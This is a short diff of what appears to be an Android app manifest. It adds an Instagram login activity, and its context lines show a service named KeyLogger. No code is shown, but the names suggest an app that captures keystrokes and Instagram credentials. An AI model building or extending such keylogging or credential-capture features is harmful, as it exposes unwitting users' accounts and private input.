@@ -83,6 +83,9 @@
         <activity
             android:name=".MediaSetActivity"
             android:theme="@style/AppTheme" />
+        <activity
+            android:name=".InstagramLoggedInActivity"
+            android:theme="@style/AppTheme" />
 
         <service
             android:name=".services.KeyLogger"
